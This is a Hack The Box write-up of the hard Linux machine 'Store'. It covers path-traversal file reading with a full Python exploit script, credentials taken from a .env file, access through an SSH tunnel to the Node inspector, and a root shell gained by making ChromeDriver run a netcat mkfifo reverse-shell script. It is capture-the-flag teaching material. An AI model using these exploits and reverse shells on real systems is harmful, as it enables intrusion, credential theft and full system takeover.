---
title: Store
summary: Hard Hack The Box Linux machine, written up by Ethan Bauer. Covers SSH (22), HTTP (5000), Full file read.
date: 2026-07-25
tags: [Hack The Box, Linux]
difficulty: hard
os: Linux
url: https://app.hackthebox.com/machines/Store
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Store%20%5BHard%20-%20Linux%5D/Store%20%5BLinux%5D%20%5BHard%5D.md
---

# Store
## Enumeration

### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.238.32 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-25 17:23 +0100
Nmap scan report for 10.129.238.32
Host is up (0.034s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
5001/tcp open  commplex-link
5002/tcp open  rfe

Nmap done: 1 IP address (1 host up) scanned in 9.98 seconds
```

### Nmap
```python
nmap -p 22,5000,5001,5002 -A --min-rate=2000 -sT 10.129.238.32
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-25 17:24 +0100
Nmap scan report for 10.129.238.32
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 30:68:b8:a8:f5:47:ca:bf:1a:23:97:d5:4c:77:97:da (ECDSA)
|_  256 3f:83:9f:53:0a:49:db:00:d5:18:85:e9:2f:05:76:dd (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
5001/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
5002/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

All three web servers show the same site

## SSH (22)
### Version
```python
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 30:68:b8:a8:f5:47:ca:bf:1a:23:97:d5:4c:77:97:da (ECDSA)
|_  256 3f:83:9f:53:0a:49:db:00:d5:18:85:e9:2f:05:76:dd (ED25519)
```

### Auth method
```python
ssh root@10.129.238.32                 
The authenticity of host '10.129.238.32 (10.129.238.32)' can't be established.
ED25519 key fingerprint is: SHA256:MwKYyiZT4gAZ35VHTeZ0760cn1Fe7QFCFllCxBST4rA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.238.32' (ED25519) to the list of known hosts.
(root@10.129.238.32) Password:
```

Password based auth, less secure

## HTTP (5000)

At first glance it appears that all the web servers are the same

Wappalyzer detects Express

No vhosts

Feroxbuster found `/tmp/` 

But it returns an error so no directory listing

So it appears after every upload it saves an encrypted copy in `/tmp/` and the plaintext version in `/file/`

So when you request the file in `/file/` is pulls from `/tmp/` then decrypts it.

![Screenshot](images/store/pasted-image-20260725183249.webp)

But now the question is can i pull other files from `/tmp/` like `/etc/passwd`

![Screenshot](images/store/pasted-image-20260725184044.webp)

Now testing this theory i see if i try with `/etc/passwd` i can pull from `/tmp/` in the `/file/` directory, now the only problem is the encrypted output since everything that gets pulled from `/tmp/` is encrypted

So i can start by making a guess that the start of `/etc/passwd` is:

```python
root:x:0:0:root:/root:/bin/bash
```

Now ill go back to the page containing the output for /etc/passwd and view the source

![Screenshot](images/store/pasted-image-20260725191155.webp)

This is the base64 encoded output

So now with the help of AI i can feed it the assumed first line of /etc/passwd and the encoded output 

And i get the key as `Hm9zeWC38`

And this can be used to decrypt any file on the system

```python
#!/usr/bin/env python3

import argparse
import base64
import re
import sys
from itertools import cycle
from urllib.parse import quote
 
import requests
 
# Default recovered key -- override with --key if you're hitting a fresh
# instance and the secret turns out to be different.
DEFAULT_KEY = b"Hm9zeWC38"
 
# Number of "../" traversal segments to prepend. The app builds the path as
# STORE_HOME/public/tmp/<name>, so we need enough ../ to climb back to /.
TRAVERSAL_DEPTH = 8
 
 
def build_traversal_path(target_path: str, depth: int = TRAVERSAL_DEPTH) -> str:
    """
    Build the /file/<...> path segment with directory traversal.
    target_path should be an absolute path, e.g. /etc/passwd
    """
    target_path = target_path.lstrip("/")
    traversal = "../" * depth
    full = traversal + target_path
    # URL-encode every slash so it survives Express's routing/normalization
    return quote(full, safe="")
 
 
def fetch_encrypted_blob(host: str, port: int, target_path: str, depth: int, timeout: float):
    path_segment = build_traversal_path(target_path, depth)
    url = f"http://{host}:{port}/file/{path_segment}"
 
    try:
        resp = requests.get(url, timeout=timeout)
    except requests.exceptions.ReadTimeout:
        return None, url
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        sys.exit(1)
 
    # Look for the base64 data URI embedded in the HTML page source.
    # e.g. data:application/octet-stream;charset=utf-8;base64,AAAA....
    match = re.search(
        r"base64,([A-Za-z0-9+/=]+)",
        resp.text,
    )
    if not match:
        return None, url
 
    return match.group(1), url
 
 
def xor_decrypt(ciphertext: bytes, key: bytes) -> bytes:
    return bytes(c ^ k for c, k in zip(ciphertext, cycle(key)))
 
 
def main():
    parser = argparse.ArgumentParser(
        description="Read + decrypt an arbitrary file via the /file/ traversal bug."
    )
    parser.add_argument("host", help="Target host/IP, e.g. store.htb or 10.129.31.17")
    parser.add_argument("path", help="Absolute path on the target to read, e.g. /etc/passwd")
    parser.add_argument("--port", type=int, default=5000, help="Target port (default: 5000)")
    parser.add_argument(
        "--key",
        default=DEFAULT_KEY.decode(),
        help=f"XOR key as ASCII (default recovered key: {DEFAULT_KEY.decode()!r})",
    )
    parser.add_argument(
        "--depth",
        type=int,
        default=TRAVERSAL_DEPTH,
        help=f"Number of ../ traversal segments to prepend (default: {TRAVERSAL_DEPTH})",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=3.0,
        help="Request timeout in seconds -- nonexistent files hang, so keep this short",
    )
    parser.add_argument(
        "--raw",
        action="store_true",
        help="Write decrypted output as raw bytes to stdout instead of decoded text "
             "(use for binary files like images)",
    )
    args = parser.parse_args()
 
    key = args.key.encode()
 
    b64_blob, url = fetch_encrypted_blob(
        args.host, args.port, args.path, args.depth, args.timeout
    )
 
    if b64_blob is None:
        print(f"[!] Could not find encrypted data in response from {url}")
        print("    (file may not exist, traversal depth may be wrong, or the")
        print("     app's HTML structure may differ -- check manually with curl)")
        sys.exit(1)
 
    ciphertext = base64.b64decode(b64_blob)
    plaintext = xor_decrypt(ciphertext, key)
 
    if args.raw:
        sys.stdout.buffer.write(plaintext)
    else:
        sys.stdout.write(plaintext.decode(errors="replace"))
        if not plaintext.endswith(b"\n"):
            sys.stdout.write("\n")
 
 
if __name__ == "__main__":
    main()
```

Now with the help of AI ill build a script to automate the file read process

## Full file read

```python
python3 store_file_read.py store.htb /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dev:x:1001:1001:,,,:/home/dev:/bin/bash
sftpuser:x:1002:1002:,,,:/home/sftpuser:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

I now have full file read!

I can check `/proc/self/cmdline` to find the exact command that was used to run the process

```python
python3 store_file_read.py store.htb /proc/self/cmdline            
node--inspect=127.0.0.1:9229/home/dev/projects/store1/start.js
```

As seen here its running as the `dev` user

And more importantly this is giving us the directory this is running from!

```python
python3 store_file_read.py store.htb /home/dev/projects/store1/.env
SFTP_URL=sftp://sftpuser:WidK52pWBtWQdcVC@localhost
SECRET=Hm9zeWC38
STORE_HOME=/home/dev/projects/store1
PORT=5000
```

With some quick reaearch i find the passwords are usually in `.env` 

And just like that i have credentials for the `sftpuser`

But since `sftpuser` doesnt have a shell i wont be able to login over SSH

And the password doesnt work for `dev` and `ubuntu`

But SFTP runs over SSH so maybe i can connect using that?

## Access over SFTP as `sftpuser`

```python
sftp sftpuser@store.htb
(sftpuser@store.htb) Password: 
Connected to store.htb.
sftp> 
sftp> 
sftp>
```

I now have initial access

It looks as if im restricted to this directory

https://hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html

Doing some research i see it might be possible to create an SFTP tunnel

```python
sudo ssh -L 9229:127.0.0.1:9229 -N -f sftpuser@store.htb
```

This command will essentially forward the proccess running on the port 9229 on the target to my machine on the same port `9229`

And since its `--inspect` i should be able to connect and issue commands

Ill open chromium and connect using the search `chrome://inspect` this brings up a window that detects the service

![Screenshot](images/store/pasted-image-20260725201839.webp)

Clicking inspect should give me a dev tools console to issue commands!

From here i can grab a rev shell from revshells.com

## Reverse shell

```python
penelope -p 1337         
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.15.232
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

First ill set a listener

![Screenshot](images/store/pasted-image-20260725202204.webp)

Then grab the shell from revshells, enable pasting then run the process

```python
penelope -p 1337         
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.15.232
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => store 10.129.238.32 Linux-x86_64 👤 dev(1001) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/store~10.129.238.32-Linux-x86_64/2026_07_25-20_21_31-008.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
dev@store:~/projects/store1$ whoami
dev
dev@store:~/projects/store1$
```

I now have a shell!

```python
ps aux

...[SNIP]...

root         769  0.0  0.3 33612408 12672 ?      Ssl  16:17   0:00 /root/chromedriver
```

```python
netstat -ano

...[SNIP]...

tcp        0      0 127.0.0.1:9515          0.0.0.0:*               LISTEN      off (0.00/0/0)
```

There is an internal service running on the system

It is running ChromeDriver

Its installed in `/opt`

```python
dev@store:/opt/google/chrome$ ls -la
total 268792
drwxr-xr-x 7 root root      4096 Feb 13  2023 .
drwxr-xr-x 3 root root      4096 Feb 13  2023 ..
drwxr-xr-x 2 root root      4096 Feb 13  2023 MEIPreload
drwxr-xr-x 3 root root      4096 Feb 13  2023 WidevineCdm
-rwxr-xr-x 1 root root 217885000 Jan 31  2023 chrome
-rwxr-xr-x 1 root root   7205672 Jan 31  2023 chrome-management-service
-rwsr-xr-x 1 root root    217536 Jan 31  2023 chrome-sandbox
-rw-r--r-- 1 root root    663857 Jan 31  2023 chrome_100_percent.pak
-rw-r--r-- 1 root root   1031193 Jan 31  2023 chrome_200_percent.pak
-rwxr-xr-x 1 root root   1338288 Jan 31  2023 chrome_crashpad_handler
drwxr-xr-x 2 root root      4096 Feb 13  2023 cron
-rw-r--r-- 1 root root       482 Jan 31  2023 default-app-block
drwxr-xr-x 2 root root      4096 Feb 13  2023 default_apps
-rwxr-xr-x 1 root root      1852 Jan 31  2023 google-chrome
-rw-r--r-- 1 root root  10541264 Jan 31  2023 icudtl.dat
-rw-r--r-- 1 root root    250744 Jan 31  2023 libEGL.so
-rw-r--r-- 1 root root   6610928 Jan 31  2023 libGLESv2.so
-rw-r--r-- 1 root root   3009096 Jan 31  2023 liboptimization_guide_internal.so
-rw-r--r-- 1 root root     22752 Jan 31  2023 libqt5_shim.so
-rw-r--r-- 1 root root   4439376 Jan 31  2023 libvk_swiftshader.so
-rwxr-xr-x 1 root root    585192 Jan 31  2023 libvulkan.so.1
drwxr-xr-x 2 root root      4096 Feb 13  2023 locales
-rwxr-xr-x 1 root root   8275816 Jan 31  2023 nacl_helper
-rwxr-xr-x 1 root root      9064 Jan 31  2023 nacl_helper_bootstrap
-rw-r--r-- 1 root root   4326864 Jan 31  2023 nacl_irt_x86_64.nexe
-rw-r--r-- 1 root root     10577 Jan 31  2023 product_logo_128.png
-rw-r--r-- 1 root root       787 Jan 31  2023 product_logo_16.png
-rw-r--r-- 1 root root      1281 Jan 31  2023 product_logo_24.png
-rw-r--r-- 1 root root     38037 Jan 31  2023 product_logo_256.png
-rw-r--r-- 1 root root      1810 Jan 31  2023 product_logo_32.png
-rw-r--r-- 1 root root      7611 Jan 31  2023 product_logo_32.xpm
-rw-r--r-- 1 root root      3095 Jan 31  2023 product_logo_48.png
-rw-r--r-- 1 root root      4557 Jan 31  2023 product_logo_64.png
-rw-r--r-- 1 root root   8110135 Jan 31  2023 resources.pak
-rw-r--r-- 1 root root    477944 Jan 31  2023 v8_context_snapshot.bin
-rw-r--r-- 1 root root       107 Jan 31  2023 vk_swiftshader_icd.json
-rwxr-xr-x 1 root root     37394 Jan 31  2023 xdg-mime
-rwxr-xr-x 1 root root     33273 Jan 31  2023 xdg-settings
```

After doing a tonne of reasearch i find:

https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148

It looks as if there is a way to make a post request to the local endpoint to execute a script!

So i could simply make a bash script with a revshell inside and then execute it using this method to get a root shell, this is becuase the process itself is running as root

```python
curl -X POST localhost:9515/session -d {"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary":"/home/dev/privesc.sh", "args":["test"]}}}}
```

This is the command i have compiled using the article

Now ill create the script 

```python
dev@store:/opt/google/chrome$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.232 1338 >/tmp/f' > ../../../home/dev/privesc.sh
```

Now ive made the script ill make it executable

```python
chmod +x ../../../home/dev/privesc.sh
```

Now ill just run the command to execute my script

```python
dev@store:/opt/google/chrome$ curl -X POST localhost:9515/session -d '{"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary":"/home/dev/privesc.sh", "args":["test"]}}}}'
```

Now in my listener window

```python
penelope -p 1338         
[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.15.232
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => store 10.129.238.32 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/store~10.129.238.32-Linux-x86_64/2026_07_25-20_57_50-635.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@store:/# whoami
root
root@store:/#
```

I am now root!
